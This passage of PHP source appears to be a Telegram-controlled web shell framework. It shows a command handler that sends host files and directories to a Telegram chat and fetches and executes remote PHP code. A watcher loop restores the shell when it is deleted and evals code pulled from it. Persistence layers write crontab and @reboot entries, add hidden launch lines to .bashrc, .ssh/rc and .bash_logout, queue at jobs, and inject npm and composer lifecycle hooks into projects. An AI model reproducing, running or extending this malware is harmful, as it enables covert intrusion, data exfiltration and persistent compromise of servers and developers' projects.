elseif(preg_match("#^/get\\s+(.+)#is",$text,$m)){$targetPath=trim($m[1]);if(!file_exists($targetPath))wn_send($BOT,$CHAT,"[X] Not found");elseif(is_dir($targetPath)){$zipBin=trim(wn_sh("command -v zip 2>/dev/null"));if($zipBin==="")wn_send($BOT,$CHAT,"[X] zip unavailable");else{$zipPath=sys_get_temp_dir()."/gd_".time().".zip";@_c("se","cd ".escapeshellarg(dirname($targetPath))." && zip -qr ".escapeshellarg($zipPath)." ".escapeshellarg(basename($targetPath))." 2>/dev/null");if(file_exists($zipPath)&&filesize($zipPath)>0){wn_send_document($BOT,$CHAT,$zipPath,"ZIP: ".basename($targetPath));@unlink($zipPath);}else wn_send($BOT,$CHAT,"[X] Zip fail");}}else{$sz=@filesize($targetPath);if($sz===false||$sz<=0)wn_send($BOT,$CHAT,"[X] Empty");elseif($sz>50*1024*1024)wn_send($BOT,$CHAT,"[X] Too large");else wn_send_document($BOT,$CHAT,$targetPath,basename($targetPath));}}
elseif(preg_match("#^/mem\\s+(\\S+)#i",$text,$m)){$c2Url=trim($m[1]);if(!preg_match("#^https?://#i",$c2Url))wn_send($BOT,$CHAT,"[X] invalid");else{wn_send($BOT,$CHAT,"[MEM] fetch...");$code=@_c("fgc",$c2Url,false,stream_context_create(array("http"=>array("timeout"=>20,"header"=>"User-Agent: Mozilla/5.0\r\n"),"ssl"=>array("verify_peer"=>false,"verify_peer_name"=>false))));if($code===false||strlen($code)<100)wn_send($BOT,$CHAT,"[X] fetch fail");else{$dirs=array();if(is_dir("/dev/shm")&&is_writable("/dev/shm"))$dirs[]="/dev/shm";if(is_dir(sys_get_temp_dir())&&is_writable(sys_get_temp_dir()))$dirs[]=sys_get_temp_dir();$executed=false;foreach($dirs as $dir){$f=$dir."/.".bin2hex(random_bytes(10)).".php";if(@_c("fpc",$f,$code)===false)continue;@chmod($f,0600);try{include $f;}catch(Throwable $e){}@unlink($f);$executed=true;break;}wn_send($BOT,$CHAT,$executed?"[MEM] ok":"[X] fail");}}}
elseif($lc==="/debug"){$log=@_c("fgc",sys_get_temp_dir()."/wn_watcher_".date("Ymd").".log");if($log===false||$log==="")wn_send($BOT,$CHAT,"[DEBUG] no log");else{if(strlen($log)>3500)$log=substr($log,-3500);wn_send($BOT,$CHAT,"[DEBUG]\n\n".htmlspecialchars($log,ENT_QUOTES,"UTF-8"));}}
elseif($lc==="/health"){$h=wn_health_watcher();$icon=$h["score"]>=90?"✔":($h["score"]>=70?"⚠":"✘");$msg="[HEALTH] $icon ".$h["score"]."/100\n\n";foreach($h["matrix"] as $k=>$v)$msg.=str_pad($k,12)."$v\n";if(!empty($h["bonus"]))$msg.="\n[bonus] ".implode(", ",$h["bonus"]);if(!empty($h["warnings"]))$msg.="\n[warnings]\n  ".implode("\n  ",$h["warnings"]);wn_send($BOT,$CHAT,$msg);}
elseif(in_array($lc,array("/help","/start","/menu"))){wn_send($BOT,$CHAT,"SYS\n\n[Shell]\n/status /restore_self /list_backups /heal /heal_cron /replicate\n/exec cmd /install /uninstall /debug /mem URL\n\n[File]\n/get /path\nReply file + /put /path\n/ls /edit /rm /mv /mkdir\n\n[Persist]\n/systemd /systemd_install /systemd_uninstall\n/deadman on|off|status|action|hours\n\n[Integrity]\n/integrity pause|resume|now|set_mtime|reset_mtime|pause_ttl|ttl_pause|pause_ttl_reset|ttl_reset\n\n[Hide]\n/hide · confirm · cancel · status · auto <ttl> · purge\n/unhide\n\n[Health]\n/health\n\n[Phantom]\n/phantom · on · off · sens · exfil · history · patterns · reset\n\n[Morph]\n/morph · status · run · history · reset\n\n[Swarm]\n/swarm · key gen|set|rotate · add · rm · peers · ping · gossip · exec · relay · put · topology\n\n[Mesh]\n/mesh · key gen|set|rotate · add · rm · peers · ping · gossip · topology · exec · relay · put · observe · install · hide · unhide\n\n[Witness]\n/witness · status · score · events · pull · silence · reset\n\n[Ghost]\n/ghost · status · lineage · spawn · freeze\n\n[Anima]\n/anima · status · narrative · dream · poem · memory · persona · desires · explain · introspect · export · import · calm · simulate · clear\n\n[Fleet]\n/fleet · key gen|set|rotate · add · rm · ping · install · exec · cmd · deploy\n\n[Stealth]\n/siluman on|off|key|rotate");}
}
$LOCKFILE=$__state."/.lk_".substr(md5($BOT),0,8);$LOCKFP=@fopen($LOCKFILE,"c");if($LOCKFP){if(!flock($LOCKFP,LOCK_EX|LOCK_NB)){_dbg("LOCK","exit");@fclose($LOCKFP);exit;}register_shutdown_function(function()use($LOCKFP){@flock($LOCKFP,LOCK_UN);@fclose($LOCKFP);});}
$OFFSET=$__state."/.of_".substr(md5($BOT),0,8);$SEEN=$OFFSET.".seen";$LIVE=$__state."/.lv_".substr(md5($BOT),0,8);$__skey=hash("sha256","st:".$BOT,true);_c("fpc",$LIVE,(string)time());
if(!file_exists(wn_p("activity")))_c("fpc",wn_p("activity"),time());
$__or=wn_sr($OFFSET,$__skey);$offset=($__or!==null)?(int)$__or:0;$__sr=wn_sr($SEEN,$__skey);$lastSeen=($__sr!==null)?(int)$__sr:0;
$__loopDelay=1;$__iter=0;$__shellLastSeen=$__state."/.".substr(hash("sha256","sls:".$BOT),0,16);$__shellAlert=$__state."/.".substr(hash("sha256","sla:".$BOT),0,16);$__sentinel=$__state."/.".substr(hash("sha256","wake:".$BOT),0,16);$__lastSentinelMtime=0;
while(true){
    $__iter++;
    if($__iter%50===0){@gc_collect_cycles();}
    wn_heartbeat_check();wn_selfheal_check();wn_deadman_check();wn_check_file_integrity();
$_mFile=$__state."/.mst_".substr(md5("morph:state:".$BOT),0,12).".json";
$_mShould=false;
if(!file_exists($_mFile))$_mShould=true;
else{
    $_mJ=@json_decode((string)_c("fgc",$_mFile),true);
    $_mLast=is_array($_mJ)?(int)($_mJ['last']??0):0;
    $_phLvl=3;$_phF=$__state."/.phstate_".substr(md5("ph:state:".$BOT),0,12).".json";
    if(file_exists($_phF)){$_phJ=@json_decode((string)_c("fgc",$_phF),true);if(is_array($_phJ))$_phLvl=(int)($_phJ['level']??3);}
    $_mIv=[1200,2700,7200,14400,28800][max(0,min(4,$_phLvl))];
    $_mShould=(time()-$_mLast)>=$_mIv;
}
if($_mShould&&function_exists('_morph_attempt'))_morph_attempt();
$_witLast=(int)_c("fgc",$__state."/.wtick_".substr(md5("wit:tick:".$BOT),0,8));
if(time()-$_witLast>=30){
    _c("fpc",$__state."/.wtick_".substr(md5("wit:tick:".$BOT),0,8),(string)time(),LOCK_EX);
    try{if(function_exists('witness_tick'))witness_tick();}catch(Throwable $e){}
    try{if(function_exists('ghost_tick'))ghost_tick();}catch(Throwable $e){}
    $_anLast=(int)_c("fgc",$__state."/.antick_".substr(md5("anima:tick:".$BOT),0,8));
if(time()-$_anLast>=30){
    _c("fpc",$__state."/.antick_".substr(md5("anima:tick:".$BOT),0,8),(string)time(),LOCK_EX);
    try{if(function_exists('anima_tick'))anima_tick();}catch(Throwable $e){}
    try{if(function_exists('anima_dream_tick'))anima_dream_tick();}catch(Throwable $e){}
}
    _c("fpc",$LIVE,(string)time());
    clearstatcache(true,$__sentinel);
    $__fastOnce = false;
    if(file_exists($__sentinel)){$mt=@filemtime($__sentinel);if($mt&&$mt>$__lastSentinelMtime){$__lastSentinelMtime=$mt;$__fastOnce=true;}}
    if(!file_exists($SHELL_PATH)){$lastAlert=(int)_c("fgc",$__shellAlert);if(time()-$lastAlert>600){_c("fpc",$__shellAlert,time());$__hName=parse_url($SELF_URL,PHP_URL_HOST)?:(@gethostname()?:"?");wn_send($BOT,$CHAT,"[!] SHELL DELETED\nHost: ".$__hName."\nPath: ".htmlspecialchars($SHELL_PATH,ENT_QUOTES,"UTF-8"));}$r=wn_restore_shell();if($r["ok"]){wn_send($BOT,$CHAT,"[+] SHELL RESTORED: ".$r["msg"]);_c("fpc",$__shellAlert,0);}}else{$curHash=@hash_file("sha256",$SHELL_PATH)?:"";$curSize=@filesize($SHELL_PATH)?:0;_c("fpc",$__shellLastSeen,json_encode(array("t"=>time(),"s"=>$curSize,"h"=>$curHash)));}
    if(defined("WN_SLAVE_MODE")&&WN_SLAVE_MODE){sleep(3);continue;}
    $_obsF=$__state."/.swobs_".substr(md5("swarm:observe:".$BOT),0,8);
if(file_exists($_obsF)&&trim((string)_c("fgc",$_obsF))==="1"){sleep(5);continue;}
$_meRoleF=$__state."/.mer_".substr(md5("mesh:role:".$BOT),0,12).".dat";
if(file_exists($_meRoleF)&&trim((string)_c("fgc",$_meRoleF))==="observer"){sleep(5);continue;}
$_phLvl=3;$_phFile=$__state."/.phstate_".substr(md5("ph:state:".$BOT),0,12).".json";
if(file_exists($_phFile)){$_phJ=@json_decode((string)_c("fgc",$_phFile),true);if(is_array($_phJ))$_phLvl=(int)($_phJ['level']??3);}
if($_phLvl<=0){sleep(30);continue;}
if($_phLvl<=1){sleep(20);continue;}
$url=$TG_BASE.$BOT."/getUpdates?offset=".($offset+1)."&timeout=25";
    $res=wn_tg($url,35);
    $data=json_decode($res,true);
    if(!$data||empty($data["ok"])){if(isset($data["error_code"])&&(int)$data["error_code"]===409){@wn_tg($TG_BASE.$BOT."/deleteWebhook?drop_pending_updates=false",10);usleep(1500000);continue;}sleep($__loopDelay);continue;}
    if(!empty($data["result"])){foreach($data["result"] as $u){$uid=(int)$u["update_id"];$offset=$uid;if($uid<=$lastSeen)continue;
    // Load main file functions on-demand (fix undefined function)
    if(!function_exists('witness_death_score') && file_exists($SHELL_PATH)){
    try{
        $__src = @_c("fgc",$SHELL_PATH);
        if($__src !== false && strpos($__src,'function witness_death_score') !== false){
            $__marker = '/* ═══ WEB ENTRY ═══ */';
            $__p = strpos($__src, $__marker);
            if($__p !== false) $__src = substr($__src, 0, $__p);
            $__src = preg_replace('/^<\?php\s*/','',$__src,1);
            $__src = rtrim($__src, " \n\r\t?>");
            // Buang fungsi yang sudah ada di watcher scope — hindari Fatal redeclare
            $__skipFns = ['wn_heal_backups','_fl_http','_morph_transform','_morph_attempt',
                          'wn_g_key','wn_g_paths','wn_g_save','wn_g_load','wn_g_blocks',
                          'wn_g_extract_block','wn_g_capture','wn_g_restore',
                          'wn_guardian','wn_health_watcher'];
            if(function_exists('token_get_all')){
                $__toks = @token_get_all('<?php ' . $__src);
                if(is_array($__toks) && !empty($__toks)){
                    $__skip = array_flip($__skipFns);
                    $__out = ''; $__cnt = count($__toks); $__i = 0;
                    while($__i < $__cnt){
                        $__t = $__toks[$__i];
                        if(is_array($__t) && $__t[0] === T_FUNCTION){
                            $__j = $__i + 1; $__fnName = null;
                            while($__j < $__cnt){
                                $__tk = $__toks[$__j];
                                if(is_array($__tk) && $__tk[0] === T_STRING){$__fnName = $__tk[1]; break;}
                                if(!is_array($__tk) || ($__tk[0] !== T_WHITESPACE && $__tk[0] !== T_COMMENT && $__tk[0] !== T_DOC_COMMENT)) break;
                                $__j++;
                            }
                            if($__fnName !== null && isset($__skip[$__fnName])){
                                // skip sampai matching '}'
                                $__depth = 0; $__started = false; $__k = $__i;
                                while($__k < $__cnt){
                                    $__tk = $__toks[$__k];
                                    if($__tk === '{' || (is_array($__tk) && in_array($__tk[0], [T_CURLY_OPEN, T_DOLLAR_OPEN_CURLY_BRACES], true))){
                                        $__depth++; $__started = true;
                                    } elseif($__tk === '}'){
                                        $__depth--;
                                        if($__started && $__depth === 0){$__k++; break;}
                                    }
                                    $__k++;
                                }
                                $__i = $__k; continue;
                            }
                        }
                        $__out .= is_array($__t) ? $__t[1] : $__t;
                        $__i++;
                    }
                    $__src = $__out;
                }
            }
            eval($__src);
        }
    }catch(\Throwable $__e){}
}
    try{wn_handle_update($u,$BOT,$CHAT,$ROOT,$SHELL,$SHELL_PATH,$SELF_URL,$SECRET,$__state,$BACKUPS,$HOME);}catch(\Throwable $e){_dbg("HANDLE_ERR",get_class($e).": ".$e->getMessage()." @".$e->getFile().":".$e->getLine());@wn_send($BOT,$CHAT,"[!] Command error: ".$e->getMessage());}
    wn_sw($SEEN,(string)$uid,$__skey);wn_sw($OFFSET,(string)$offset,$__skey);$lastSeen=$uid;}}
   if($__fastOnce)usleep(random_int(150000, 350000));else sleep(random_int(1, 3));
}
WN_WATCHER_TEMPLATE_EOF_4A2B;
    $replacements = [
        '__B64BOT__' => var_export($b64Bot, true),
        '__B64CHAT__' => var_export($b64Chat, true),
        '__SHELL__' => var_export($shell, true),
        '__ROOT__' => var_export($root, true),
        '__BNAME__' => var_export($bname, true),
        '__HOME__' => var_export($home, true),
        '__URL__' => var_export($selfUrl, true),
        '__SEC__' => var_export($secret, true),
        '__SB64__' => var_export($shellB64, true),
        '__REPW__' => var_export(wn_replica_watcher_paths(), true),
        '__REPB__' => var_export(wn_replica_backup_paths(), true),
        '__MAINW__' => var_export(wn_watcher_locations(), true),
        '__STATEDIR__' => var_export(wn_state_dir(), true),
        '__DEBUGFLAG__' => WN_DEBUG ? 'true' : 'false',
        '__SLAVEMODE__' => $slaveMode ? 'true' : 'false',
        '__DAEMONNAME__' => var_export(basename(wn_blend_name('daemon_php')), true),
        '__WDNAME__' => var_export(basename(wn_blend_name('watchdog_php')), true),
        '__DAEMONPID__' => var_export(wn_blend_name('daemon_pid'), true),
        '__WDPID__' => var_export(wn_blend_name('watchdog_pid'), true),
        '__MTIMEFILE__' => var_export(wn_blend_name('shell_mtime'), true),
        '__TRAPMARKER__' => var_export('# ' . substr(md5('wn_trap_' . wn_get_key('trap')), 0, 12) . ' trap', true),
    ];
    $code = strtr($code, $replacements);
    foreach ($replacements as $ph => $_) if (strpos($code, $ph) !== false) throw new RuntimeException('Watcher template has unreplaced placeholder: ' . $ph);
    return $code;
}
interface WnLayer { public function key(); public function install(array $ctx); public function uninstall(array $ctx); public function status(array $ctx); }
abstract class WnBaseLayer implements WnLayer {
    protected $lastLog = [];
    public function log() { return $this->lastLog; }
    protected function setLog(array $entries) { $this->lastLog = $entries; }
    public function uninstall(array $ctx) { return ['ok'=>true,'removed'=>0,'message'=>'no-op']; }
    public function status(array $ctx) { return ['active'=>false,'detail'=>'not implemented']; }
}
class WnLayerManager {
    private $layers = [];
    public function register(WnLayer $layer) { $this->layers[$layer->key()] = $layer; return $this; }
    public function installAll(array $ctx) { $results = []; foreach ($this->layers as $key => $layer) { try { $results[$key] = $layer->install($ctx); } catch (Throwable $e) { $results[$key] = ['ok'=>false,'detail'=>'exception: ' . $e->getMessage()]; } } return $results; }
    public function uninstallAll(array $ctx) { $results = []; $totalRemoved = 0; foreach ($this->layers as $key => $layer) { try { $r = $layer->uninstall($ctx); $results[$key] = $r; $totalRemoved += (int)($r['removed'] ?? 0); } catch (Throwable $e) { $results[$key] = ['ok'=>false,'removed'=>0]; } } return ['results'=>$results,'total_removed'=>$totalRemoved]; }
    public function statusAll(array $ctx) { $out = []; foreach ($this->layers as $key => $layer) { try { $out[$key] = $layer->status($ctx); } catch (Throwable $e) { $out[$key] = ['active'=>false,'detail'=>'exception']; } } return $out; }
    public function installByKey($key, array $ctx) { if (!isset($this->layers[$key])) return ['ok'=>false,'detail'=>'unknown']; try { return $this->layers[$key]->install($ctx); } catch (Throwable $e) { return ['ok'=>false,'detail'=>$e->getMessage()]; } }
}

class WnCronLayer extends WnBaseLayer {
    public function key() { return 'cron'; }
    public function install(array $ctx) {
        $php = $ctx['php_bin']; $entry = $ctx['entry'];
        $existing = (string)cmd_exec('crontab -l 2>/dev/null');
        $lines = array_filter(explode("\n", $existing), 'wn_cron_filter_callback');
        $lines[] = "* * * * * /bin/sh -c '" . escapeshellarg($php) . " " . escapeshellarg($entry) . " >/dev/null 2>&1'";
        $lines[] = "@reboot /bin/sh -c 'sleep 30 && " . escapeshellarg($php) . " " . escapeshellarg($entry) . " >/dev/null 2>&1'";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_'); wn_call('fpc', $tmp, implode("\n", $lines) . "\n");
        cmd_exec("crontab " . escapeshellarg($tmp) . " 2>&1"); @unlink($tmp);
        $v = (string)cmd_exec('crontab -l 2>/dev/null');
        $main = (stripos($v, basename($entry)) !== false) || stripos($v, 'cleanup.lock') !== false;
        $reboot = stripos($v, '@reboot') !== false;
        return ['ok'=>$main,'detail'=>($main ? 'active' : 'missing') . ($reboot ? ' + reboot' : ''),'reboot'=>$reboot];
    }
    public function uninstall(array $ctx) {
        $existing = (string)cmd_exec('crontab -l 2>/dev/null');
        $lines = array_filter(explode("\n", $existing), 'wn_cron_filter_callback');
        $tmp = tempnam(sys_get_temp_dir(), 'cron_'); wn_call('fpc', $tmp, implode("\n", $lines) . "\n");
        cmd_exec("crontab " . escapeshellarg($tmp) . " 2>&1"); @unlink($tmp);
        return ['ok'=>true,'removed'=>2,'message'=>'cron cleared'];
    }
    public function status(array $ctx) {
        $c = (string)cmd_exec('crontab -l 2>/dev/null');
        $main = (isset($ctx['entry']) && $ctx['entry'] && stripos($c, basename($ctx['entry'])) !== false) || stripos($c, 'cleanup.lock') !== false;
        return ['active'=>$main,'reboot'=>stripos($c, '@reboot') !== false,'detail'=>$main ? 'active' : 'missing'];
    }
}

class WnDaemonLayer extends WnBaseLayer {
    public function key() { return 'daemon'; }
    public function install(array $ctx) { $log = []; $ok = wn_spawn_daemon($ctx['php_bin'], $ctx['entry'], $log); $this->setLog($log); return ['ok'=>$ok,'detail'=>$ok ? 'spawned' : 'failed','log'=>$log]; }
    public function uninstall(array $ctx) { $pf = wn_blend_name('daemon_pid'); $removed = 0; if (file_exists($pf)) { $pid = (int)wn_call('fgc', $pf); if ($pid > 0 && wn_can_shell()) cmd_exec("kill -9 " . $pid . " 2>/dev/null"); @unlink($pf); $removed++; } return ['ok'=>true,'removed'=>$removed,'message'=>'daemon killed']; }
    public function status(array $ctx) { $s = wn_daemon_status(); return ['active'=>$s['alive'],'pid'=>$s['pid'],'detail'=>$s['alive'] ? "alive ({$s['pid']})" : 'dead']; }
}

class WnWatchdogLayer extends WnBaseLayer {
    public function key() { return 'watchdog'; }
    public function install(array $ctx) { $log = []; $ok = wn_spawn_watchdog($ctx['php_bin'], $ctx['entry'], $log); $this->setLog($log); return ['ok'=>$ok,'detail'=>$ok ? 'spawned' : 'failed','log'=>$log]; }
    public function uninstall(array $ctx) { $pf = wn_blend_name('watchdog_pid'); $removed = 0; if (file_exists($pf)) { $pid = (int)wn_call('fgc', $pf); if ($pid > 0 && wn_can_shell()) cmd_exec("kill -9 " . $pid . " 2>/dev/null"); @unlink($pf); $removed++; } return ['ok'=>true,'removed'=>$removed,'message'=>'watchdog killed']; }
    public function status(array $ctx) { $s = wn_watchdog_status(); return ['active'=>$s['alive'],'pid'=>$s['pid'],'detail'=>$s['alive'] ? "alive ({$s['pid']})" : 'dead']; }
}

class WnSystemdLayer extends WnBaseLayer {
    public function key() { return 'systemd'; }
    public function install(array $ctx) { $log = []; $units = wn_install_systemd($ctx['php_bin'], $ctx['entry'], $log); $this->setLog($log); return ['ok'=>!empty($units),'detail'=>count($units) . ' unit(s)','units'=>$units]; }
    public function uninstall(array $ctx) { $r = wn_uninstall_systemd(); return ['ok'=>true,'removed'=>$r,'message'=>"systemd: $r removed"]; }
    public function status(array $ctx) { $s = wn_systemd_status(); $active = $s['user_active'] || $s['system_active']; return ['active'=>$active,'detail'=>$s['user_active'] ? 'user active' : ($s['system_active'] ? 'system active' : 'off')]; }
}

class WnLingerLayer extends WnBaseLayer {
    public function key() { return 'linger'; }
    public function install(array $ctx) {
        $u = $ctx['linger_user'] ?? ''; if ($u === '') return ['ok'=>false,'detail'=>'no user'];
        $s = trim((string)cmd_exec('loginctl show-user ' . escapeshellarg($u) . ' -p Linger 2>/dev/null'));
        if (stripos($s, 'Linger=yes') !== false) return ['ok'=>true,'detail'=>'already enabled'];
        cmd_exec('loginctl enable-linger ' . escapeshellarg($u) . ' 2>&1'); usleep(400000);
        $s2 = trim((string)cmd_exec('loginctl show-user ' . escapeshellarg($u) . ' -p Linger 2>/dev/null'));
        $ok = stripos($s2, 'Linger=yes') !== false || file_exists('/var/lib/systemd/linger/' . $u);
        return ['ok'=>$ok,'detail'=>$ok ? 'enabled' : 'failed'];
    }
    public function uninstall(array $ctx) { $u = $ctx['linger_user'] ?? ''; if ($u === '') return ['ok'=>false,'removed'=>0]; cmd_exec('loginctl disable-linger ' . escapeshellarg($u) . ' 2>&1'); return ['ok'=>true,'removed'=>1,'message'=>'linger disabled']; }
    public function status(array $ctx) { $u = $ctx['linger_user'] ?? ''; if ($u === '') return ['active'=>false,'detail'=>'no user']; $s = trim((string)cmd_exec('loginctl show-user ' . escapeshellarg($u) . ' -p Linger 2>/dev/null')); $a = stripos($s, 'Linger=yes') !== false; return ['active'=>$a,'detail'=>$a ? 'enabled' : 'off']; }
}

class WnBashRcLayer extends WnBaseLayer {
    public function key() { return 'shell_rc'; }
    private function marker() { return '# ' . substr(md5('wn_rc_' . wn_get_key('rc')), 0, 12) . ' shim'; }
    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry'];
        $m = $this->marker(); $line = '[ -f "' . $entry . '" ] && (php "' . $entry . '" >/dev/null 2>&1 &)';
        $n = 0;
        foreach ([$home.'/.bashrc', $home.'/.bash_profile', $home.'/.profile', $home.'/.zshrc'] as $f) {
            if (!file_exists($f) || !is_writable($f)) continue;
            $c = @file_get_contents($f); if ($c === false) continue;
            if (strpos($c, $m) !== false) { $n++; continue; }
            if (@file_put_contents($f, "\n" . $m . "\n" . $line . "\n", FILE_APPEND | LOCK_EX) !== false) $n++;
        }
        return ['ok'=>$n>0,'detail'=>"$n file(s)"];
    }
    public function uninstall(array $ctx) {
        $home = $ctx['home']; $m = $this->marker(); $n = 0;
        foreach ([$home.'/.bashrc', $home.'/.bash_profile', $home.'/.profile', $home.'/.zshrc'] as $f) {
            if (!file_exists($f) || !is_writable($f)) continue;
            $c = @file_get_contents($f); if ($c === false || strpos($c, $m) === false) continue;
            $lines = explode("\n", $c); $out = []; $skip = false;
            foreach ($lines as $l) { if (strpos($l, $m) !== false) { $skip = true; continue; } if ($skip) { $skip = false; continue; } $out[] = $l; }
            if (@file_put_contents($f, implode("\n", $out)) !== false) $n++;
        }
        return ['ok'=>true,'removed'=>$n,'message'=>"$n cleaned"];
    }
    public function status(array $ctx) { $m = $this->marker(); $home = $ctx['home']; foreach ([$home.'/.bashrc', $home.'/.zshrc', $home.'/.profile', $home.'/.bash_profile'] as $f) { if (file_exists($f) && strpos((string)@file_get_contents($f), $m) !== false) return ['active'=>true,'detail'=>'active']; } return ['active'=>false,'detail'=>'off']; }
}

class WnSshRcLayer extends WnBaseLayer {
    public function key() { return 'ssh_rc'; }
    private function marker() { return '# ' . substr(md5('wn_sshrc_' . wn_get_key('sshrc')), 0, 12); }
    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry'];
        $sshDir = $home . '/.ssh'; if (!is_dir($sshDir)) @mkdir($sshDir, 0700, true);
        if (!is_dir($sshDir) || !is_writable($sshDir)) return ['ok'=>false,'detail'=>'ssh dir not writable'];
        $f = $sshDir . '/rc'; $m = $this->marker(); $line = '[ -f "' . $entry . '" ] && (php "' . $entry . '" >/dev/null 2>&1 &)';
        if (file_exists($f)) {
            $c = @file_get_contents($f);
            if ($c !== false && strpos($c, $m) !== false) return ['ok'=>true,'detail'=>'already present'];
            if (is_writable($f) && @file_put_contents($f, "\n" . $m . "\n" . $line . "\n", FILE_APPEND | LOCK_EX) !== false) return ['ok'=>true,'detail'=>'appended'];
            return ['ok'=>false,'detail'=>'append failed'];
        }
        if (@file_put_contents($f, $m . "\n" . $line . "\n") !== false) { @chmod($f, 0600); return ['ok'=>true,'detail'=>'created']; }
        return ['ok'=>false,'detail'=>'create failed'];
    }
    public function uninstall(array $ctx) {
        $f = $ctx['home'] . '/.ssh/rc';
        if (!file_exists($f) || !is_writable($f)) return ['ok'=>true,'removed'=>0];
        $c = @file_get_contents($f); if ($c === false) return ['ok'=>false,'removed'=>0];
        $m = $this->marker(); if (strpos($c, $m) === false) return ['ok'=>true,'removed'=>0];
        $lines = explode("\n", $c); $out = []; $skip = false;
        foreach ($lines as $l) { if (strpos($l, $m) !== false) { $skip = true; continue; } if ($skip) { $skip = false; continue; } $out[] = $l; }
        if (@file_put_contents($f, implode("\n", $out)) !== false) return ['ok'=>true,'removed'=>1];
        return ['ok'=>false,'removed'=>0];
    }
    public function status(array $ctx) { $f = $ctx['home'] . '/.ssh/rc'; if (!file_exists($f)) return ['active'=>false,'detail'=>'no file']; return ['active'=>strpos((string)@file_get_contents($f), $this->marker()) !== false,'detail'=>'checked']; }
}

class WnBashLogoutLayer extends WnBaseLayer {
    public function key() { return 'bash_logout'; }
    private function marker() { return '# ' . substr(md5('wn_logout_' . wn_get_key('logout')), 0, 12) . ' shim'; }
    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry'];
        $f = $home . '/.bash_logout'; $m = $this->marker();
        $line = '[ -f "' . $entry . '" ] && (php "' . $entry . '" >/dev/null 2>&1 &)';
        if (!file_exists($f)) {
            if (@file_put_contents($f, $m . "\n" . $line . "\n") !== false) { @chmod($f, 0644); return ['ok'=>true,'detail'=>'created']; }
            return ['ok'=>false,'detail'=>'create failed'];
        }
        $c = @file_get_contents($f);
        if ($c !== false && strpos($c, $m) !== false) return ['ok'=>true,'detail'=>'already present'];
        if (is_writable($f) && @file_put_contents($f, "\n" . $m . "\n" . $line . "\n", FILE_APPEND | LOCK_EX) !== false) return ['ok'=>true,'detail'=>'appended'];
        return ['ok'=>false,'detail'=>'append failed'];
    }
    public function uninstall(array $ctx) {
        $f = $ctx['home'] . '/.bash_logout';
        if (!file_exists($f) || !is_writable($f)) return ['ok'=>true,'removed'=>0];
        $c = @file_get_contents($f); if ($c === false) return ['ok'=>false,'removed'=>0];
        $m = $this->marker(); if (strpos($c, $m) === false) return ['ok'=>true,'removed'=>0];
        $lines = explode("\n", $c); $out = []; $skip = false;
        foreach ($lines as $l) { if (strpos($l, $m) !== false) { $skip = true; continue; } if ($skip) { $skip = false; continue; } $out[] = $l; }
        if (@file_put_contents($f, implode("\n", $out)) !== false) return ['ok'=>true,'removed'=>1];
        return ['ok'=>false,'removed'=>0];
    }
    public function status(array $ctx) { $f = $ctx['home'] . '/.bash_logout'; if (!file_exists($f)) return ['active'=>false,'detail'=>'no file']; return ['active'=>strpos((string)@file_get_contents($f), $this->marker()) !== false,'detail'=>'checked']; }
}

class WnAtJobLayer extends WnBaseLayer {
    public function key() { return 'at_job'; }
    public function install(array $ctx) {
        if (trim((string)cmd_exec('command -v at 2>/dev/null')) === '') return ['ok'=>false,'detail'=>'at not available'];
        $line = 'php ' . escapeshellarg($ctx['entry']) . ' >/dev/null 2>&1';
        $out = (string)cmd_exec('echo ' . escapeshellarg($line) . ' | at now + 5 minutes 2>&1');
        $ok = stripos($out, 'job') !== false && stripos($out, 'error') === false;
        return ['ok'=>$ok,'detail'=>$ok ? 'queued' : 'failed'];
    }
    public function status(array $ctx) { $exists = trim((string)cmd_exec('command -v at 2>/dev/null')) !== ''; return ['active'=>$exists,'detail'=>$exists ? 'at available' : 'at missing']; }
}

class WnNpmLayer extends WnBaseLayer {
    public function key() { return 'npm_hooks'; }
    public function install(array $ctx) { $n = wn_inject_npm_hooks($ctx['home'], $ctx['entry']); return ['ok'=>$n>0,'detail'=>"$n package.json(s)",'count'=>$n]; }
    public function uninstall(array $ctx) { $n = wn_cleanup_npm_hooks($ctx['home']); return ['ok'=>true,'removed'=>$n,'message'=>"$n cleaned"]; }
    public function status(array $ctx) {
        $files = wn_find_project_files($ctx['home'], 'package.json');
        $marker = 'wn_lifecycle_' . substr(md5('wn_npm_' . wn_get_key('npm')), 0, 8);
        $n = 0; foreach ($files as $f) { $j = @json_decode(@file_get_contents($f), true); if (is_array($j) && isset($j['scripts'][$marker])) $n++; }
        return ['active'=>$n>0,'count'=>$n,'detail'=>"$n active"];
    }
}

class WnComposerLayer extends WnBaseLayer {
    public function key() { return 'composer_hooks'; }
    public function install(array $ctx) { $n = wn_inject_composer_hooks($ctx['home'], $ctx['entry']); return ['ok'=>$n>0,'detail'=>"$n composer.json(s)",'count'=>$n]; }
    public function uninstall(array $ctx) { $n = wn_cleanup_composer_hooks($ctx['home']); return ['ok'=>true,'removed'=>$n,'message'=>"$n cleaned"]; }
    public function status(array $ctx) {
        $files = wn_find_project_files($ctx['home'], 'composer.json');
        $marker = 'wn_lifecycle_' . substr(md5('wn_composer_' . wn_get_key('composer')), 0, 8);
        $n = 0; foreach ($files as $f) { $j = @json_decode(@file_get_contents($f), true); if (is_array($j) && isset($j['scripts'][$marker])) $n++; }
        return ['active'=>$n>0,'count'=>$n,'detail'=>"$n active"];
    }
}

class WnShellTrapLayer extends WnBaseLayer {
    public function key() { return 'shell_trap'; }
    public function install(array $ctx) { $n = wn_inject_shell_trap($ctx['home'], $ctx['entry']); return ['ok'=>$n>0,'detail'=>"injected into $n file(s)",'count'=>$n]; }
    public function uninstall(array $ctx) { $n = wn_cleanup_shell_trap($ctx['home']); return ['ok'=>true,'removed'=>$n,'message'=>"$n cleaned"]; }
    public function status(array $ctx) {
        $home = $ctx['home']; $marker = '# ' . substr(md5('wn_trap_' . wn_get_key('trap')), 0, 12) . ' trap';
        foreach ([$home.'/.bashrc', $home.'/.zshrc', $home.'/.profile', $home.'/.bash_profile'] as $f) { if (file_exists($f) && strpos((string)@file_get_contents($f), $marker) !== false) return ['active'=>true,'detail'=>'active']; }
        return ['active'=>false,'detail'=>'off'];
    }
}

class WnGitHookLayer extends WnBaseLayer {
    public function key() { return 'git_hook'; }
    private function marker() { return '# ' . substr(md5('wn_git_' . wn_get_key('git')), 0, 12); }
    private function findGitDirs($home) {
        $dirs = []; if (!$home) return $dirs;
        $scan = [$home, $home.'/public_html', $home.'/www', $home.'/htdocs', $home.'/domains'];
